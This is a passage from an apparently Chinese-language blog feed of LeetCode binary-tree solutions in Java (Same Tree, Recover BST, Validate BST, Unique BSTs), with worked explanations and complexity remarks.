<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input:     1         1</span><br><span class="line">          / \       / \</span><br><span class="line">         2   1     1   2</span><br><span class="line"></span><br><span class="line">        [1,2,1],   [1,1,2]</span><br><span class="line"></span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最初想到的就是一一比对二叉树的根节点、左节点和右节点，如果发现不想等的地方，则返回false；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span> || q == <span class="keyword">null</span>) <span class="keyword">return</span> p == q;</span><br><span class="line">    Queue&lt;TreeNode&gt; queueP = <span class="keyword">new</span> LinkedList&lt;&gt;(),</span><br><span class="line">                    queueQ = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queueP.add(p); queueQ.add(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!queueP.isEmpty() &amp;&amp; !queueQ.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (queueP.peek().val != queueQ.peek().val)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        </span><br><span class="line">        TreeNode curP = queueP.poll(), curQ = queueQ.poll();</span><br><span class="line">        <span class="keyword">if</span> (curP.left == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curQ.left != <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            queueP.add(curP.left);</span><br><span class="line">            queueQ.add(curQ.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (curP.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curQ.right != <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;  <span class="keyword">else</span> &#123;</span><br><span class="line">            queueP.add(curP.right);</span><br><span class="line">            queueQ.add(curQ.right);</span><br><span class="line">        &#125;          </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> queueP.isEmpty() &amp;&amp; queueQ.isEmpty();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后写了个递归版本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSameTree</span><span class="params">(TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span> || q == <span class="keyword">null</span>) <span class="keyword">return</span> p == q;</span><br><span class="line">    <span class="keyword">if</span> (p.val != q.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!isSameTree(p.left, q.left)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!isSameTree(p.right, q.right)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>递归真的是太简洁了！！！！而且运算时间还快！对于树的题目来说，还是写递归好。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[99. Recover Binary Search Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-99-Recover-Binary-Search-Tree/</url>
      <content type="html"><![CDATA[<p>Two elements of a binary search tree (BST) are swapped by mistake.</p>
<p>Recover the tree without changing its structure.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,null,null,2]</span><br><span class="line"></span><br><span class="line">   1</span><br><span class="line">  /</span><br><span class="line"> 3</span><br><span class="line">  \</span><br><span class="line">   2</span><br><span class="line"></span><br><span class="line">Output: [3,1,null,null,2]</span><br><span class="line"></span><br><span class="line">   3</span><br><span class="line">  /</span><br><span class="line"> 1</span><br><span class="line">  \</span><br><span class="line">   2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,1,4,null,null,2]</span><br><span class="line"></span><br><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">1   4</span><br><span class="line">   /</span><br><span class="line">  2</span><br><span class="line"></span><br><span class="line">Output: [2,1,4,null,null,3]</span><br><span class="line"></span><br><span class="line">  2</span><br><span class="line"> / \</span><br><span class="line">1   4</span><br><span class="line">   /</span><br><span class="line">  3</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ul>
<li>A solution using $O(n)$ space is pretty straight forward.</li>
<li>Could you devise a constant space solution?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实一点都不难，最多medium，就是中序遍历的升级版。难点是确定发生错误的节点。因为交换错误非常简单，把两个节点值互换而已。那么怎么确定发生错误的节点呢？我们知道搜索二叉树的中序遍历是升序序列，发生交换有两种情况：</p>
<ul>
<li>两个相邻节点互换，有1个数字不遵循升序序列</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   3       </span><br><span class="line">  / \   </span><br><span class="line"> /   \  </span><br><span class="line"> 1   4   </span><br><span class="line">    /   </span><br><span class="line">    2             </span><br><span class="line">中序遍历：[1,3,2,4]</span><br><span class="line">   2       </span><br><span class="line">  / \   </span><br><span class="line"> /   \  </span><br><span class="line"> 1   4   </span><br><span class="line">    /   </span><br><span class="line">    3              </span><br><span class="line">中序遍历：[1,2,3,4]</span><br></pre></td></tr></table></figure>
<ul>
<li>两个不相邻节点互换，有2个数字不遵循升序序列。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   2       </span><br><span class="line">  / \   </span><br><span class="line"> /   \  </span><br><span class="line"> 4   1   </span><br><span class="line">    /   </span><br><span class="line">    3             </span><br><span class="line">中序遍历：[4,2,3,1]</span><br><span class="line">   2       </span><br><span class="line">  / \   </span><br><span class="line"> /   \  </span><br><span class="line"> 1   4   </span><br><span class="line">    /   </span><br><span class="line">    3          </span><br><span class="line">中序遍历：[1,2,3,4]</span><br></pre></td></tr></table></figure>
<p>第二种情况则很简单，直接交换；那么第一种呢，观察发现，当两个相邻节点互换，两个节点在遍历的时候分别为发现错误的节点和错误节点的前一个节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode prev;   <span class="comment">// 前一个节点的值</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">0</span>;   <span class="comment">// 遍历的节点个数</span></span><br><span class="line"><span class="keyword">private</span> TreeNode errorNode1, errorNode2;   <span class="comment">// 错误的节点 </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recoverTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    errorNode1 = <span class="keyword">null</span>;</span><br><span class="line">    errorNode2 = <span class="keyword">null</span>;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    inorderTraversal(root);</span><br><span class="line">    <span class="keyword">int</span> temp = errorNode2.val;</span><br><span class="line">    errorNode2.val = errorNode1.val;</span><br><span class="line">    errorNode1.val = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversal(root.left);</span><br><span class="line">    <span class="keyword">if</span> (num++ != <span class="number">0</span> &amp;&amp; root.val &lt;= prev.val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errorNode2 == <span class="keyword">null</span>)</span><br><span class="line">            errorNode1 = prev;</span><br><span class="line">        errorNode2 = root;</span><br><span class="line">    &#125;</span><br><span class="line">    prev = root;</span><br><span class="line">    inorderTraversal(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[98. Validate Binary Search Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-98-Validate-Binary-Search-Tree/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, determine if it is a valid binary search tree (BST).</p>
<p>Assume a BST is defined as follows:</p>
<ul>
<li>The left subtree of a node contains only nodes with keys <strong>less than</strong> the node’s key.</li>
<li>The right subtree of a node contains only nodes with keys <strong>greater than</strong> the node’s key.</li>
<li>Both the left and right subtrees must also be binary search trees.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    2</span><br><span class="line">   / \</span><br><span class="line">  1   3</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    5</span><br><span class="line">   / \</span><br><span class="line">  1   4</span><br><span class="line">     / \</span><br><span class="line">    3   6</span><br><span class="line">Output: false</span><br><span class="line">Explanation: The input is: [5,1,4,null,null,3,6]. The root node&apos;s value</span><br><span class="line">             is 5 but its right child&apos;s value is 4.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目题意非常清楚：确认二叉树是否为二叉搜索树。所以最笨的方法就是使用题目定义的三种条件去一一确认。使用前序遍历获得子树的节点，这里直接照搬144. Binary Tree Preorder Traversal的代码过来。时间复杂度为$O(n^2)$，空间复杂度为$O(n^2)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="comment">// 确认左子树节点都小于该节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i: preorderTraversal(root.left))</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= root.val) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 确认右子树节点都大于该节点</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i: preorderTraversal(root.right))</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= root.val) <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    <span class="comment">// 确认左子树和右子树也是二叉搜索树</span></span><br><span class="line">    <span class="keyword">return</span> isValidBST(root.left) &amp;&amp; isValidBST(root.right);    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    preorderTraversalHelper(root, list); </span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preorderTraversalHelper</span><span class="params">(TreeNode root, List&lt;Integer&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    list.add(root.val);</span><br><span class="line">    preorderTraversalHelper(root.left, list);</span><br><span class="line">    preorderTraversalHelper(root.right, list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化一下，在遍历的时候进行判断。由于右子树和左子树的判断条件不同，所以写了两个函数<code>preorderTraversalLeft</code>、<code>preorderTraversalRight</code>分别进行遍历并判断。返回的结果是，是否符合给定的条件。时间复杂度为$O(n^2)$，空间复杂度为$O(1)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!preorderTraversalLeft(root.left, root.val)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!preorderTraversalRight(root.right, root.val)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isValidBST(root.left) &amp;&amp; isValidBST(root.right);    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">preorderTraversalLeft</span><span class="params">(TreeNode root, <span class="keyword">int</span> comparison)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.val &gt;= comparison) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> preorderTraversalLeft(root.left, comparison) &amp;&amp;</span><br><span class="line">        preorderTraversalLeft(root.right, comparison);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">preorderTraversalRight</span><span class="params">(TreeNode root, <span class="keyword">int</span> comparison)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.val &lt;= comparison) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> preorderTraversalRight(root.left, comparison) &amp;&amp;</span><br><span class="line">        preorderTraversalRight(root.right, comparison);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这道题目有个trick，因为二叉搜索树的中序遍历有个特点，它是个递增序列。所以只需要中序遍历二叉搜索树一次，然后看看中序遍历是否是递增序列即可。中序遍历的方法可以参照94. Binary Tree Inorder Traversal，这里直接照搬过来了。时间复杂度为$O(n)$，空间复杂度为$O(2n)$。空间复杂度为$O(2n)$的原因是一个List保存遍历结果，一个Stack保存将要遍历的节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = inOrderTraversal(root);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (++i &lt; list.size()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list.get(i) &lt;= list.get(i - <span class="number">1</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Integer&gt; <span class="title">inOrderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// reach left </span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        list.add(cur.val);</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，写完以后肯定会有疑问，是否可以边遍历边判断呢？答案当然是肯定的。既然中序遍历是一个递增序列，那么只要保存前面一个遍历节点prev，然后比较现在的节点cur是否大于前面节点prev就行了。用不到保存遍历结果。时间复杂度为$O(n)$，空间复杂度为$O(n)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">int</span> prevVal = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>; <span class="comment">// the lenght of the in-order traversal</span></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// reach left </span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        <span class="keyword">if</span> (num != <span class="number">0</span> &amp;&amp; cur.val &lt;= prevVal) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        num++;</span><br><span class="line">        prevVal = cur.val;</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是还是可以再快一点。可以进一步降低空间复杂度为$O(1)$。因为中序遍历有多种方法，最快的一种是带有帮助函数的递归。所以可以应用该种递归，然后在递归时进行判断。这种方法击败了100%，运行时间只有0ms。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> prev;   <span class="comment">// 前一个节点的值</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">0</span>;   <span class="comment">// 遍历的节点个数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    prev = Integer.MIN_VALUE;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inorderTraversalHelper(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">inorderTraversalHelper</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!inorderTraversalHelper(root.left)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (num++ != <span class="number">0</span> &amp;&amp; root.val &lt;= prev) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    prev = root.val;</span><br><span class="line">    <span class="keyword">if</span> (!inorderTraversalHelper(root.right)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[96. Unique Binary Search Trees]]></title>
      <url>/wiki/2017/10/30/Leetcode-96-Unique-Binary-Search-Trees/</url>
      <content type="html"><![CDATA[<p>Given $n$, how many structurally unique <strong>BST</strong>‘s (binary search trees) that store values 1 … $n$?</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: 5</span><br><span class="line">Explanation:</span><br><span class="line">Given n = 3, there are a total of 5 unique BST&apos;s:</span><br><span class="line"></span><br><span class="line">   1         3     3      2      1</span><br><span class="line">    \       /     /      / \      \</span><br><span class="line">     3     2     1      1   3      2</span><br><span class="line">    /     /       \                 \</span><br><span class="line">   2     1         2                 3</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>假设$n$个节点存在二叉搜索树的个数是$G(n)$，可以选取$0&lt;i&lt;n$为根节点，则$0\sim i$为左子树，$i+1\sim n$为右子树。而右子树也可以以这种方式构建。假设选取$0&lt;i&lt;n$为根节点，则左子树的个数为$G(i-1)$，右子树的的个数为$G(n-i)$，所以以$i$为根节点的二叉搜索树一共有$G(i-1)\times G(n-i)$种。最终形成的二叉搜索树一共有$\sum_{i=0}^{i=n} G(i-1)\times G(n-i)$种。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/LeetCode96S.png?imageslim" alt="LeetCode96S"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] G = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    G[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> nn = <span class="number">1</span>; nn &lt;= n; ++nn)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= nn; ++i)</span><br><span class="line">        G[nn] += G[i - <span class="number">1</span>] * G[nn - i];</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> G[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[95. Unique Binary Search Trees II]]></title>
      <url>/wiki/2017/10/30/Leetcode-95-Unique-Binary-Search-Trees-II/</url>
      <content type="html"><![CDATA[<p>Given an integer $n$, generate all structurally unique <strong>BST</strong>‘s (binary search trees) that store values $1 … n$.</p>
<p>Example:</p>
